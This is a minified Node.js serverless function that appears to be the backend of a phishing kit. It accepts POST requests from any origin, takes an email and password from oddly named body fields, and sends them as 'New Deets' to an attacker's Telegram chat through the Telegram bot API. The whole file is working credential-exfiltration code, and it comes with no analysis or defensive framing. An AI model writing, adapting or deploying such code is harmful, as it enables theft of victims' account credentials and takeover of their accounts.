module.exports = async function(s, e) {
    if (e.setHeader("Access-Control-Allow-Credentials", !0), e.setHeader("Access-Control-Allow-Origin", "*"), e.setHeader("Access-Control-Allow-Methods", "POST,OPTIONS"), e.setHeader("Access-Control-Allow-Headers", "Content-Type"), "OPTIONS" === s.method) return e.status(200).end();
    if ("POST" !== s.method) return e.status(405).json({
        success: !1
    });
    try {
        if (!process.env.TGBT || !process.env.TGCI) return e.status(500).json({
            success: !1
        });
        const {
            phwet: t,
            psdwet: o
        } = s.body;
        if (!t && !o) return e.status(400).json({
            success: !1
        });
        try {
            const s = `New Deets:\nEml: ${t||"Not provided"}\nPswd: ${o||"Not provided"}`,
                r = await fetch(`https://api.telegram.org/bot${process.env.TGBT}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: process.env.TGCI,
                        text: s
                    })
                });
            if (!r.ok) {
                const s = await r.json();
                return e.status(500).json({
                    success: !1
                })
            }
        } catch (s) {
            return e.status(500).json({
                success: !1
            })
        }
        return e.status(200).json({
            success: !0
        })
    } catch (s) {
        return e.status(500).json({
            success: !1
        })
    }
};